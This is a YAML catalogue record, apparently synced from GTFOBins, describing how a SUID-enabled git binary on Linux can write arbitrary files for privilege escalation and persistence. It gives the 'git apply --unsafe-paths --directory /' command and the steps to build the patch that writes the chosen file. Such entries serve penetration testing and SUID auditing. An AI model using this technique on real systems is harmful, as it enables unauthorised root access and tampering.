id: gtfobins/git/file-write/suid
type: binary
platform: linux
name: git
phases:
- persistence
- privilege-escalation
capabilities:
- file-write
privilege_required: suid
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: MIT (verify upstream LICENSE)
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: git apply --unsafe-paths --directory / x.patch
  comment: 'The patch can be created locally by creating the file that will be written on the target using
    its absolute path:


    ```

    echo DATA >/path/to/input-file

    git diff /dev/null /path/to/input-file >x.patch

    ```'
references:
- https://gtfobins.github.io/gtfobins/git/
